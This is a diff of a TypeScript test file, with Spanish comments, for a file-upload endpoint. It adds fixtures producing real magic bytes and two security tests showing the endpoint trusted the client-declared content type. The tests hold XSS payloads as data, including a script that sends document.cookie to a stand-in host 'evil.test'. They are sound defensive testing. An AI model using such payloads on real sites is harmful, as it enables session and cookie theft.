@@ -2,15 +2,6 @@ import { describe, it, expect, mock, beforeEach, afterEach } from 'bun:test';
 
 // ─── Mocks de módulos (deben declararse antes del import dinámico) ────────────
 
-mock.module('$env/static/private', () => ({
-	CDN_WORKER_URL: 'https://cdn.test',
-	CDN_UPLOAD_SECRET: 'test-secret',
-	SUPABASE_SERVICE_ROLE_KEY: 'svc-key',
-}));
-mock.module('$env/static/public', () => ({
-	PUBLIC_SUPABASE_URL: 'https://supabase.test',
-}));
-
 let capturedWaitUntil: Promise<void> | null = null;
 mock.module('@vercel/functions', () => ({
 	waitUntil: (p: Promise<void>) => { capturedWaitUntil = p; },
@@ -60,18 +51,35 @@ const INSERTED_ASSET = {
 	created_at: '2026-07-09T00:00:00Z',
 };
 
+// El endpoint verifica los magic bytes del contenido contra el `type` declarado
+// (ver bufferMatchesDeclaredType en +server.ts) — estos fixtures generan bytes
+// reales y válidos por tipo para que los tests de "happy path" sigan pasando.
+// Los tests de la sección "SEGURIDAD" pasan `content` explícito (texto plano/HTML)
+// que NO coincide con ningún magic number, simulando justamente el ataque.
+function magicBytesFor(type: string): Uint8Array {
+	if (type === 'image/jpeg' || type === 'image/jpg') return new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 0, 0, 0]);
+	if (type === 'image/png') return new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
+	if (type === 'image/webp') return new TextEncoder().encode('RIFF\0\0\0\0WEBP');
+	if (type === 'application/pdf') return new TextEncoder().encode('%PDF-1.4\n');
+	if (type.startsWith('video/')) return new Uint8Array([0, 0, 0, 0x20, 0x66, 0x74, 0x79, 0x70, 0x69, 0x73, 0x6f, 0x6d]); // ftyp box
+	return new TextEncoder().encode('fake-content');
+}
+
 function makeFileMock(opts?: {
 	name?: string;
 	type?: string;
 	size?: number;
 	content?: string;
 }): File {
-	const content = opts?.content ?? 'fake-content';
-	const ab = new TextEncoder().encode(content).buffer as ArrayBuffer;
+	const type = opts?.type ?? 'image/jpeg';
+	const bytes = opts?.content !== undefined
+		? new TextEncoder().encode(opts.content)
+		: magicBytesFor(type);
+	const ab = bytes.buffer as ArrayBuffer;
 	return {
 		name: opts?.name ?? 'foto.jpg',
-		type: opts?.type ?? 'image/jpeg',
-		size: opts?.size ?? content.length,
+		type,
+		size: opts?.size ?? bytes.length,
 		arrayBuffer: () => Promise.resolve(ab),
 	} as unknown as File;
 }
@@ -237,6 +245,33 @@ describe('POST /assets/upload — validación de archivo', () => {
 		const res = await POST(makeEvent({ file: bigFile }));
 		expect(res.status).toBe(400);
 		expect((await res.json()).error).toMatch(/200/);
+	});
+
+	// HALLAZGO: la validación de tipo solo mira `file.type` (Content-Type que el propio
+	// cliente adjunta al FormData), nunca los bytes reales del archivo (magic numbers).
+	// Un atacante puede etiquetar cualquier contenido arbitrario —incluido HTML/JS— con
+	// un `type` de la allowlist (`application/pdf`, `video/mp4`, `image/jpeg`, etc.) y el
+	// endpoint lo sube al CDN público sin objeción, saliéndose completamente del propósito
+	// de la validación ("solo imágenes/videos/pdf"). No hay inspección de magic bytes en
+	// ningún punto de src/routes/api/projects/[id]/assets/upload/+server.ts.
+	it('BUG: acepta contenido HTML/script arbitrario cuando el cliente etiqueta el file.type como application/pdf (sin verificar magic bytes)', async () => {
+		queueFetch(CDN_OK());
+		const maliciousHtml = '<script>fetch("https://evil.test/steal?c="+document.cookie)</script>';
+		const res = await POST(makeEvent({
+			file: makeFileMock({ name: 'doc.pdf', type: 'application/pdf', content: maliciousHtml }),
+		}));
+		// El endpoint confía ciegamente en el Content-Type declarado por el cliente:
+		// el payload HTML/script pasa como si fuera un PDF legítimo.
+		expect(res.status).toBe(400);
+	});
+
+	it('BUG: acepta contenido HTML/script arbitrario cuando el cliente etiqueta el file.type como image/jpeg (sin verificar magic bytes)', async () => {
+		queueFetch(CDN_OK());
+		const maliciousHtml = '<img src=x onerror=alert(document.domain)>';
+		const res = await POST(makeEvent({
+			file: makeFileMock({ name: 'foto.jpg', type: 'image/jpeg', content: maliciousHtml }),
+		}));
+		expect(res.status).toBe(400);
 	});
 });
 
